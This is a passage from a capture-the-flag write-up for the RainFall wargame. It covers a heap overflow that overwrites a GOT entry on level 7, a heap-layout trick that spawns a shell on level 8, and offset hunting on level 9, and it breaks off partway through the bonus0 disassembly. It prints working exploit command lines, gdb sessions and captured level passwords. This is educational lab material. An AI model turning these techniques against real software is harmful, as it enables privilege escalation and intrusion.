Segmentation fault (core dumped)
```

- As address randomization is disabled on the vm, I tried to identify the returns of the malloc calls, which will always be the same as long as they succeed and we try to malloc a size of the same range (tiny / small) and the allocation is not in it's own page

```bash
level7@RainFall:~$ gdb -x /tmp/gdb ./level7
(gdb) r $(python -c 'print "A"*50') $(python -c 'print "B"*50')
Starting program: /home/user/level7/level7 $(python -c 'print "A"*50') $(python -c 'print "B"*50')

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6

(gdb) b *main+21
(gdb) b *main+47
(gdb) b *main+68
(gdb) b *main+94

(gdb) r $(python -c 'print "A"*50') $(python -c 'print "B"*50')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7 $(python -c 'print "A"*50') $(python -c 'print "B"*50')

Breakpoint 1, 0x08048536 in main ()
(gdb) printf "%x", $eax
804a008

(gdb) continue
Continuing.

Breakpoint 2, 0x08048550 in main ()

(gdb) printf "%x", $eax
804a018

(gdb) continue
Continuing.

Breakpoint 3, 0x08048550 in main ()

(gdb) printf "%x", $eax
804a028

(gdb) continue
Continuing.

Breakpoint 4, 0x08048550 in main ()

(gdb) printf "%x", $eax
804a038
```

- As we can see all the allocations are separated by 16 bytes, which makes 8 given to our program and 8 others for the aligned malloc structure

Our main() function can be annotated like:

```c
void    m(void) {
        unsigned char   align[24];

        printf("%s - %d", 0x8049960, time(NULL));
        return ;
}

int             main() {
        void            *s1;
        void            *s2;
        unsigned char   align[24];

        s1 = malloc(8); // if succeeds, returns 0x804a008
        s1[0] = 1;
        
        s1[1] = malloc(8); // 0x804a018
        
        s2 = malloc(8); // 0x804a028
        s2[0] = 2;
        
        s2[1] = malloc(8); // 0x804a038
        
        strcpy(s1[1], av[1]);
        
        strcpy(s2[1], av[2]);

        fgets(0x8049960, 68, fopen("/home/user/level8/.pass", "r"));

        puts("~~");

        return (0);
}
```

- Now back on gdb, let's inspect what the first strcpy is doing

```bash
(gdb) b *main+132

(gdb) r $(python -c 'print "A"*50') $(python -c 'print "B"*50')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7 $(python -c 'print "A"*50') $(python -c 'print "B"*50')

Breakpoint 1, 0x080485a5 in main ()

(gdb) x/100x 0x804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x00004141      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
```

The 1st line is the first allocation,

`0x804a008:      [0x00000001]      0x0804a018      0x00000000      0x00000011`

we can see the first byte is equals to `1`,

`0x804a008:      0x00000001      [0x0804a018]      0x00000000      0x00000011`

the next one to the address of the 2nd allocation where the strcpy writes,

`0x804a008:      0x00000001      0x0804a018      [[0x00000000]      [0x0000001][1]]`

and the 2 last bytes are the structure used by malloc for the next allocation, the 1st is for the alignement of the structure, and the 2th contains a `status` bit (lowest weight) set to 1 to indicate the allocation isn't free, and the rest are the size of the structure (16).

- Most importantly, we can see the `strcpy` writes over structures used by malloc

- And the 2nd strcpy makes the program segfault by trying to write on *0x41414141

```bash
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

- The address the second strcpy writes to is defined at 0x41414141, so we can write to any address the content of av[2] if we pass in av[1] (0x804a038 – 0x804a018 = 0x20 / 32) bytes and the address 

Let's do a quick test:

```bash
(gdb) b *main+132

(gdb) r $(python -c 'print "A"*8') $(python -c 'print "B"*4')
Breakpoint 1, 0x080485a5 in main ()

(gdb) x/100x 0x804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41414141      0x41414141      0x00000000      0x00000011
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
...

(gdb) b *main+161

(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x38\xa0\x04\x08') $(python -c 'print "B"*4')
Breakpoint 1, 0x080485a5 in main ()

(gdb) continue
Continuing.

Breakpoint 2, 0x080485c2 in main ()

(gdb) x/100x 0x804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x02010101      0x0804a038      0x00000000      0x00000011
0x804a038:      0x42424242      0x00000000      0x00000000      0x00020fc1
...

(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x48\xa0\x04\x08') $(python -c 'print "B"*4')

Breakpoint 1, 0x080485a5 in main ()

(gdb) set {char}0x080486fb='7' # fgets() will crash when opening the level8 password file as we cannot setuid to level8

(gdb) continue
Continuing.

Breakpoint 2, 0x080485c2 in main ()

(gdb) x/100x 0x804a008
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x02010101      0x0804a048      0x00000000      0x00000011
0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
0x804a048:      0x42424242      0x00000000      0x00000000      0x00000000
0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
...

(gdb) continue
Continuing.
~~
[Inferior 1 (process 2891) exited normally]

```

- We wrote 16 bytes after the malloc call ! The program doesn't segfault as we're still in the same memory page, usually of size 4096

Note that I changed the value of `2` assigned with some '\x01', doing '\x00' instead would cause the strcpy() to stop

- Now let's try to overwrite the puts() call:

```bash
level7@RainFall:~$ objdump -R ./level7

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
...
08049928 R_386_JUMP_SLOT   puts
...

# Back in gdb
(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e 'BBBB')
Starting program: /home/user/level7/level7 $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e 'BBBB')

Breakpoint 1, 0x080485a5 in main ()
(gdb) continue
Continuing.

Breakpoint 2, 0x080485c2 in main ()
(gdb) set {char}0x080486fb='7'
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

- Our EIP has changed to the address we wrote at the location of puts() ! Let's try again with the address of the m() function

```bash
(gdb) r $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e '\xf4\x84\x04\x08')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7 $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e '\xf4\x84\x04\x08')

Breakpoint 1, 0x080485a5 in main ()

(gdb) continue
Continuing.

Breakpoint 2, 0x080485c2 in main ()

(gdb) set {char}0x080486fb='7'

(gdb) continue
Continuing.
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 - 1584111922
[Inferior 1 (process 2912) exited normally]
```

- Do the same without gdb calling ptrace() so we can setuid()

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*16')$(echo -n -e '\x01\x01\x01\x02')$(echo -n -e '\x28\x99\x04\x08') $(echo -n -e '\xf4\x84\x04\x08')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1584111992

level7@RainFall:~$ su level8
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8

level8@RainFall:~$
```

## Level 8

- [`-d` output](http://ix.io/2e7i)

- [repnz scas instruction](https://stackoverflow.com/questions/26783797/repnz-scas-assembly-instruction-specifics)

### ASM Interpretation

```asm
Dump of assembler code for function main:
   0x08048564 <+0>:     push   ebp ; ASM Prologue
   0x08048565 <+1>:     mov    ebp,esp ; ASM Prologue

   0x08048567 <+3>:     push   edi ; Push edi to the stack
   0x08048568 <+4>:     push   esi ; Push esi to the stack
   0x08048569 <+5>:     and    esp,0xfffffff0 ; Align esp
   0x0804856c <+8>:     sub    esp,0xa0 ; Allocate 160 bytes on the stack
   0x08048572 <+14>:    jmp    0x8048575 <main+17> ; Goto main+17
   0x08048574 <+16>:    nop
   0x08048575 <+17>:    mov    ecx,DWORD PTR ds:0x8049ab0 ; printf "%p", *0x8049ab0 -> "(nil)" ; printf "%u", *0x8049ab0 -> 0
   0x0804857b <+23>:    mov    edx,DWORD PTR ds:0x8049aac ; printf "%p", *0x8049aac -> "(nil)" ; printf "%u", *0x8049aac -> 0
   0x08048581 <+29>:    mov    eax,0x8048810 ; printf "%s", 0x8048810 -> "%p, %p"
   0x08048586 <+34>:    mov    DWORD PTR [esp+0x8],ecx
   0x0804858a <+38>:    mov    DWORD PTR [esp+0x4],edx
   0x0804858e <+42>:    mov    DWORD PTR [esp],eax
   0x08048591 <+45>:    call   0x8048410 <printf@plt> ; Call printf("%p, %p", 0x8049aac, 0x8049ab0);

   0x08048596 <+50>:    mov    eax,ds:0x8049a80 ; <stdin@@GLIBC_2.0>
   0x0804859b <+55>:    mov    DWORD PTR [esp+0x8],eax ; Save stdin as 3rd argument of fgets()
   0x0804859f <+59>:    mov    DWORD PTR [esp+0x4],0x80 ; Save 0x80 after esp
   0x080485a7 <+67>:    lea    eax,[esp+0x20] ; Set eax to the address of esp - 32 (last 128 bytes)
   0x080485ab <+71>:    mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fgets()
   0x080485ae <+74>:    call   0x8048440 <fgets@plt> ; Call fgets(esp - 32, 128, stdin);
     ;  char *fgets(char * restrict str, int size, FILE * restrict stream);

   0x080485b3 <+79>:    test   eax,eax ; if (eax == 0) error occured
   0x080485b5 <+81>:    je     0x804872c <main+456> ; jump to main+456

   0x080485bb <+87>:    lea    eax,[esp+0x20] ; Set eax to start of fgets pointer
   0x080485bf <+91>:    mov    edx,eax ; Set edx to eax
   0x080485c1 <+93>:    mov    eax,0x8048819 ; Set eax to 0x8048819 (gdb) printf "%s", 0x8048819 -> "auth "
   0x080485c6 <+98>:    mov    ecx,0x5 ; Set ecx to 5
   0x080485cb <+103>:   mov    esi,edx ; set esi to edx (start of fgets pointer)
   0x080485cd <+105>:   mov    edi,eax ; Set edi to eax ("auth ")
   0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] ; Compare 5 first bytes of esi & edi
   0x080485d1 <+109>:   seta   dl ; Set dl to above flag (*(rsi + 5) > *(rdi + 5))
   0x080485d4 <+112>:   setb   al ; Set al to below flag (*(rsi + 5) < *(rdi + 5))
   0x080485d7 <+115>:   mov    ecx,edx ; Set ecx to edx (start of fgets return pointer)
   0x080485d9 <+117>:   sub    cl,al ; Substitute al from cl
   0x080485db <+119>:   mov    eax,ecx ; Set eax to ecx
   0x080485dd <+121>:   movsx  eax,al ; Set eax to al
   0x080485e0 <+124>:   test   eax,eax ; if (eax != 0)
   0x080485e2 <+126>:   jne    0x8048642 <main+222> ; Jump to main+222

   0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4
   0x080485eb <+135>:   call   0x8048470 <malloc@plt> ; Call malloc(4)

   0x080485f0 <+140>:   mov    ds:0x8049aac,eax ; Set eax into 0x8049aac
   0x080485f5 <+145>:   mov    eax,ds:0x8049aac
   0x080485fa <+150>:   mov    DWORD PTR [eax],0x0 ; Set the variable pointed by eax to 0
   0x08048600 <+156>:   lea    eax,[esp+0x20] ; Set eax to the pointer of fgets
   0x08048604 <+160>:   add    eax,0x5 ; Add 5 to eax
   0x08048607 <+163>:   mov    DWORD PTR [esp+0x1c],0xffffffff ; Set the 28th byte of the stack memory to 0xffffffff 
   0x0804860f <+171>:   mov    edx,eax ; Set edx to eax
   0x08048611 <+173>:   mov    eax,0x0 ; Set eax to 0
   0x08048616 <+178>:   mov    ecx,DWORD PTR [esp+0x1c] ; Set ecx to the value of the 28th byte of the stack (0xffffffff)
   0x0804861a <+182>:   mov    edi,edx ; Set edx to edx
   0x0804861c <+184>:   repnz scas al,BYTE PTR es:[edi] ; With edi = esp+0x25 / 37 (0xbffff669)
    ; while(ecx != 0) {
    ;     ecx = ecx - 1;
    ;     if(ZF == 1) break;
    ; }
   0x0804861e <+186>:   mov    eax,ecx ; Set eax to ecx (len of the repnz scas operation)
   0x08048620 <+188>:   not    eax ; Reverse eax bytes
   0x08048622 <+190>:   sub    eax,0x1 ; Subsitute 1 for starting byte from eax
   0x08048625 <+193>:   cmp    eax,0x1e ; Compare eax to 0x1e / 30
   0x08048628 <+196>:   ja     0x8048642 <main+222> ; Jump if Above (unsigned comparison) -> goto main+222
   0x0804862a <+198>:   lea    eax,[esp+0x20] ; Set eax to esp-0x20
   0x0804862e <+202>:   lea    edx,[eax+0x5] ; Set edx to esp-0x25
   0x08048631 <+205>:   mov    eax,ds:0x8049aac ; Set eax to 0x8049aac
   0x08048636 <+210>:   mov    DWORD PTR [esp+0x4],edx ; Set edx as 2nd argument of strcpy
   0x0804863a <+214>:   mov    DWORD PTR [esp],eax ; Set eax as 1st argument of strcpy
   0x0804863d <+217>:   call   0x8048460 <strcpy@plt> ; Call strcpy(0x8049aac, esp+0x25)
     ; char *strcpy(char * dst, const char * src);

   0x08048642 <+222>:   lea    eax,[esp+0x20]
   0x08048646 <+226>:   mov    edx,eax ; Set edx to esp+0x20
   0x08048648 <+228>:   mov    eax,0x804881f ; Set eax to 0x804881f
   0x0804864d <+233>:   mov    ecx,0x5 ; Set ecx to 5
   0x08048652 <+238>:   mov    esi,edx ; Set esi to edx (esp+0x20)
   0x08048654 <+240>:   mov    edi,eax ; Set edi to eax (0x804881f) ; printf "%s", 0x804881f -> "reset"
   0x08048656 <+242>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] ; Compare first 5 bytes of esi & edi
   0x08048658 <+244>:   seta   dl ; Set dl to above flag
   0x0804865b <+247>:   setb   al ; Set al to below flag
   0x0804865e <+250>:   mov    ecx,edx ; Set ecx to esp+0x20
   0x08048660 <+252>:   sub    cl,al ; Substitute al from cl
   0x08048662 <+254>:   mov    eax,ecx ; Set eax to ecx
   0x08048664 <+256>:   movsx  eax,al ; Set eax to al
   0x08048667 <+259>:   test   eax,eax ; If (eax != 0)
   0x08048669 <+261>:   jne    0x8048678 <main+276> ; Goto main+276
   0x0804866b <+263>:   mov    eax,ds:0x8049aac
   0x08048670 <+268>:   mov    DWORD PTR [esp],eax
   0x08048673 <+271>:   call   0x8048420 <free@plt> ; Call free(0x8049aac)

   0x08048678 <+276>:   lea    eax,[esp+0x20]
   0x0804867c <+280>:   mov    edx,eax ; Set edx to esp+20
   0x0804867e <+282>:   mov    eax,0x8048825 ; printf "%s", 0x8048825 -> "service"
   0x08048683 <+287>:   mov    ecx,0x6 ; Set ecx to 6
   0x08048688 <+292>:   mov    esi,edx ; Set esi to edx
   0x0804868a <+294>:   mov    edi,eax ; Set edi to eax
   0x0804868c <+296>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] ; Compare first 6 bytes of edi & esi
   0x0804868e <+298>:   seta   dl ; Set dl to above flag
   0x08048691 <+301>:   setb   al ; Set al to below flag
   0x08048694 <+304>:   mov    ecx,edx ; Set ecx to edx
   0x08048696 <+306>:   sub    cl,al ; Sub al from cl
   0x08048698 <+308>:   mov    eax,ecx ; Set eax to ecx
   0x0804869a <+310>:   movsx  eax,al ; Set eax to al
   0x0804869d <+313>:   test   eax,eax ; if (eax != 0)
   0x0804869f <+315>:   jne    0x80486b5 <main+337> ; Goto main+337
   0x080486a1 <+317>:   lea    eax,[esp+0x20] ; Set eax to the value pointed by esp+0x20
   0x080486a5 <+321>:   add    eax,0x7 ; Add 7 to eax
   0x080486a8 <+324>:   mov    DWORD PTR [esp],eax ; Set eax as 1st argument of strdup
   0x080486ab <+327>:   call   0x8048430 <strdup@plt> ; Call strdup([esp+0x20] + 0x7)
   0x080486b0 <+332>:   mov    ds:0x8049ab0,eax

   0x080486b5 <+337>:   lea    eax,[esp+0x20]
   0x080486b9 <+341>:   mov    edx,eax
   0x080486bb <+343>:   mov    eax,0x804882d ; printf "%s", 0x804882d -> "login"
   0x080486c0 <+348>:   mov    ecx,0x5 ; Set ecx to 5
   0x080486c5 <+353>:   mov    esi,edx ; Set esi to esp+0x20
   0x080486c7 <+355>:   mov    edi,eax ; Set edi to 0x804882d // "login"
   0x080486c9 <+357>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>:   seta   dl
   0x080486ce <+362>:   setb   al
   0x080486d1 <+365>:   mov    ecx,edx
   0x080486d3 <+367>:   sub    cl,al
   0x080486d5 <+369>:   mov    eax,ecx
   0x080486d7 <+371>:   movsx  eax,al
   0x080486da <+374>:   test   eax,eax ; if (eax != 0)
   0x080486dc <+376>:   jne    0x8048574 <main+16> ; Goto main+16
   0x080486e2 <+382>:   mov    eax,ds:0x8049aac ; Set eax to 0x8049aac
   0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20] ; Set eax to eax+0x20 (0x8049acc)
   0x080486ea <+390>:   test   eax,eax ; If (eax == 0)
   0x080486ec <+392>:   je     0x80486ff <main+411> ; Goto main+411
   0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833 ; Set bin/sh as 1st argument of system ; printf "%s", 0x8048833 -> "/bin/sh"
   0x080486f5 <+401>:   call   0x8048480 <system@plt> ; Call system("/bin/sh");

   0x080486fa <+406>:   jmp    0x8048574 <main+16>
   0x080486ff <+411>:   mov    eax,ds:0x8049aa0
   0x08048704 <+416>:   mov    edx,eax
   0x08048706 <+418>:   mov    eax,0x804883b ; (gdb) printf "%s", 0x804883b -> "Password:\n"
   0x0804870b <+423>:   mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>:   mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>:   mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>:   mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fwrite
   0x08048722 <+446>:   call   0x8048450 <fwrite@plt> ; Call fwrite("Password:\n", 1, 10, 0x8049aa0);

   0x08048727 <+451>:   jmp    0x8048574 <main+16>

   0x0804872c <+456>:   nop
   0x0804872d <+457>:   mov    eax,0x0 ; Set eax to 0
   0x08048732 <+462>:   lea    esp,[ebp-0x8] ; De-allocate stack memory allocated with esp

   0x08048735 <+465>:   pop    esi
   0x08048736 <+466>:   pop    edi
   0x08048737 <+467>:   pop    ebp
   0x08048738 <+468>:   ret
End of assembler dump.
```

### Equivalent C source code

```c
unsigned void   **val[2] = {NULL, NULL}; // 0x8049aac, 0x8049ab0

int	main() {
	unsigned char   buf[128]; // 0xbffff650

	START: printf("%p, %p", val[0], val[1]);

	if (fgets(buf, 128, stdin) != 0)
	{
		ecx = 5;
		esi = buf;
		edi = "auth "; // 0x8048819
		while (*esi == *edi && ecx > 0) {
			esi++;
			edi++;
			ecx--;
		}
		if (*(rsi + 5) < *(rdi + 5) == 0)
		{
			val[0] = malloc(4); // 0x804a008, then 0x804a008 + (0x10 * iteration)

			edi = buf + 37;
			ecx = -1;
			while(ecx != 0) {
				ecx = ecx - 1;
				if (ZF == 1) break;
			}

			if (!(eax > 30))
				strcpy(/* 0x8049aac */ val[0], buf + 37);
		}

		ecx = 5;
		esi = buf;
		edi = "reset"; // 0x804881f
		while (*esi == *edi && ecx > 0) {
			esi++;
			edi++;
			ecx--;
		}
		if (*(rsi + 5) < *(rdi + 5) == 0)
		{
			free(/* 0x8049aac */ val[0]);
		}

		ecx = 6;
		esi = buf;
		edi = "service"; // 0x8048825
		while (*esi == *edi && ecx > 0) {
			esi++;
			edi++;
			ecx--;
		}
		if (*(rsi + 6) < *(rdi + 6) == 0)
		{
			/* *0x8049ab0 */ val[1] = strdup(buf + 7); // 0xbffff657
		}

		ecx = 5;
		esi = buf;
		edi = "login"; // 0x804882d
		while (*esi == *edi && ecx > 0) {
			esi++;
			edi++;
			ecx--;
		}
		if (*(rsi + 6) < *(rdi + 6) == 0)
		{
			if ((/* 0x8049aac */ *(val[0] + 0x20) /* 0x8049acc */)) == 0)
				system("/bin/sh");

			fwrite("Password:\n", 1, 10, 0x8049aa0);
		}
		goto START;
	}

	return 0;
}
```

### Walktrough

- After spending a lot of time trying to find what was wrong with the program, the if condition before the system() call caught my attention

It uses the address stored in val[0] by malloc (0x804a008) and compares 32 bytes after it (0x804a028), even through if the value in val[0] is the address of a malloc(4), the goal here will be to write to this byte

- If we want to use 0x804a008 (val[0]) at our starting point, we should then write 0x20 (32) bytes, unfortunately for us, if we want to use the strcpy call `strcpy(val[0], buf + 37);` with an input like:

```
level8@RainFall:~$ echo auth\ $(python -c 'print "A"*32')$(python -c 'print "B"*4')
[auth ][AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA][BBBB]
```

- 5 1st bytes set to "auth " to pass the comparison and pass in the strcpy()
- 32*"A" To reach 37 bytes, start of our strcpy source pointer
- The bytes we want to write at 0x804a028

the condition `if (!(eax > 30))` is preventing us to do so, as our buffer is longer than 30 characters

- I then tried to use the strdup() instruction `val[1] = strdup(buf + 7);`, when using strdup after val[0] has been set to the 1st malloc call, val[1] will be passed 0x804a018 (16 bytes after the 1st malloc)

- To write to the compared bytes before the shell instruction, we should then write (0x804a028 - 0x804a018) = 0x10 / 16 bytes after "service", there is no if conditions on the length of our buffer this time, so let's try it !

```bash
level8@RainFall:~$ echo 'auth ' > /tmp/input # Initialize val[0] to the 1st malloc call (0x804a008)
level8@RainFall:~$ echo 'service'$(python -c 'print "A"*16')$(python -c 'print "B"*4') >> /tmp/input # Set val[1] to strdup("AAAAAAAAAAAAAAAABBBB"), allocated at 0x804a018
level8@RainFall:~$ echo login >> /tmp/input

level8@RainFall:~$ gdb -x /tmp/gdb ./level8
...
(gdb) b *main+390
Breakpoint 1 at 0x80486ea
(gdb) r </tmp/input
Starting program: /home/user/level8/level8 </tmp/input
(nil), (nil)
0x804a008, (nil)
0x804a008, 0x804a018

Breakpoint 1, 0x080486ea in main ()
(gdb) i r
eax            0x42424242       1111638594 # eax is set to "BBBB" !
ecx            0xbffff600       -1073744384
edx            0xbffff600       -1073744384
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff630       0xbffff630
ebp            0xbffff6d8       0xbffff6d8
esi            0xbffff655       -1073744299
edi            0x8048832        134514738
eip            0x80486ea        0x80486ea <main+390>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) exit
```

```bash
level8@RainFall:~$ cat /tmp/input  - | ./level8
(nil), (nil)
0x804a008, (nil)
0x804a008, 0x804a018
pwd
/home/user/level8
whoami
level9
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Level9

- [`-d` output](http://ix.io/2eLJ)

### Equivalent CPP source code

```cpp
class N {  // ebp+0x8
public :
	char annotation[100];  // ebp+0x8 + 0x4 | size : 0x64 (0x68 - 0x4)
	int value;  // ebp+0x8 + 0x68
	N(int val) : value(val) {}  // 0x080486f6
	void	setAnnotation(char *str) {  // 0x0804870e
		int len = strlen(str);
		memcpy(annotation, str, len);
	}
	int		operator+(N const &rhs) {  // 0x0804873a
		return value + rhs.value;
	}
	int		operator-(N const &rhs) {  // 0x0804874e
		return value - rhs.value;
	}
};

int		main(int ac, char **av)
{
	if (ac <= 1)
		_exit(1);
	N *a = new N(5);  // esp+0x1c
	N *b = new N(6);  // esp+0x18
	N *c = a;  // esp+0x14
	N *d = b;  // esp+0x10
	c->setAnnotation(av[1]);
	return (*d + *c);
}
```

### Walktrough

```
# Crash avec pytnon 200
```

- We can see the program crashes with a lot of characters, let's grab a pattern from [this site](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to find the offset where the program crashes

```
level9@RainFall:~$ gdb ./level9
...
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers
eax            0x41366441       1094083649
ecx            0x67413567       1732326759
edx            0x804a0d4        134521044
ebx            0x804a078        134520952
esp            0xbffff620       0xbffff620
ebp            0xbffff648       0xbffff648
esi            0x0      0
edi            0x0      0
eip            0x8048682        0x8048682 <main+142>
eflags         0x210287 [ CF PF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

- By inputting the value of eax at the time the program crashes into the EIP value section of the website, we can see the crashing offset is `108`

## todo

## Bonus0

- [`objdump -d` output](http://ix.io/2opX)

### ASM Interpretation

```asm
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   ebp ; ASM Prologue
   0x080485a5 <+1>:     mov    ebp,esp ; ASM Prologue
   0x080485a7 <+3>:     and    esp,0xfffffff0 ; ASM Prologue

   0x080485aa <+6>:     sub    esp,0x40 ; Allocate 0x40 bytes / 64
   0x080485ad <+9>:     lea    eax,[esp+0x16] ; Set eax to esp+0x16 (22th byte of the stack)
   0x080485b1 <+13>:    mov    DWORD PTR [esp],eax ; Push eax
   0x080485b4 <+16>:    call   0x804851e <pp> ; Call pp(eax)
   0x080485b9 <+21>:    lea    eax,[esp+0x16] ; Set eax to esp+0x16 (22th byte of the stack)
   0x080485bd <+25>:    mov    DWORD PTR [esp],eax ; Push eax
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt> ; Call puts(eax)
   0x080485c5 <+33>:    mov    eax,0x0 ; Set 0 as return value

   0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret
End of assembler dump.

Dump of assembler code for function pp:
   0x0804851e <+0>:     push   ebp
   0x0804851f <+1>:     mov    ebp,esp
   0x08048521 <+3>:     push   edi
   0x08048522 <+4>:     push   ebx

   0x08048523 <+5>:     sub    esp,0x50 ; Allocate 0x50 (80) bytes
   0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0 ; Push 0x80486a0 as 2nd argument of p (gdb) printf "%s", 0x80486a0 -> " - "
   0x0804852e <+16>:    lea    eax,[ebp-0x30] ; Set eax to ebp-0x30 (48th byte of the stack)
   0x08048531 <+19>:    mov    DWORD PTR [esp],eax ; Push eax
   0x08048534 <+22>:    call   0x80484b4 <p> ; Call p(ebp-0x30, " - ")

   0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0 ; Push 0x80486a0 as 2nd argument of p (gdb) printf "%s", 0x80486a0 -> " - "
   0x08048541 <+35>:    lea    eax,[ebp-0x1c] ; Set eax to ebp-0x1c (28th byte of the stack)
   0x08048544 <+38>:    mov    DWORD PTR [esp],eax ; Push eax
   0x08048547 <+41>:    call   0x80484b4 <p> ; Call p(ebp-0x1c, " - ")

   0x0804854c <+46>:    lea    eax,[ebp-0x30] ; Set eax to ebp-0x30
   0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax ; Push eax as 2nd argument of strcpy
   0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8] ; Set eax to ebp (1st argument of pp)
   0x08048556 <+56>:    mov    DWORD PTR [esp],eax ; Push eax
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt> ; call strcpy(ebp+0x8, ebp-0x30)

   0x0804855e <+64>:    mov    ebx,0x80486a4 ; Set ebx to 0x80486a4
   0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8] ; Set eax to the value of the first argument of pp
   0x08048566 <+72>:    mov    DWORD PTR [ebp-0x3c],0xffffffff ; Set *ebp-0x3c (60th byte) to 0

   0x0804856d <+79>:    mov    edx,eax
   0x0804856f <+81>:    mov    eax,0x0
   0x08048574 <+86>:    mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:    mov    edi,edx
   0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi] ; https://stackoverflow.com/questions/26783797/repnz-scas-assembly-instruction-specifics
   0x0804857b <+93>:    mov    eax,ecx : Set eax to ecx
   0x0804857d <+95>:    not    eax ; !eax
